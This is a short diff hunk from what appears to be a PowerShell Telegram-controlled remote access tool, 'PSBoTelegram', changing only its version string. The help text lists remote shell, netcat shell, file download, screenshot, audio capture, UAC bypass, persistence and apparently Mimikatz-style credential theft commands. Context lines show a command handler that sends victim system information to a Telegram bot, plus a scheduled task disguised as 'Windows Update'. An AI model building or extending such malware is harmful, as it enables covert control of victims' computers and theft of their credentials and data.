@@ -230,7 +230,7 @@ Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregis
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.6`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
+ $help = "PSBoTelegram V0.7`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
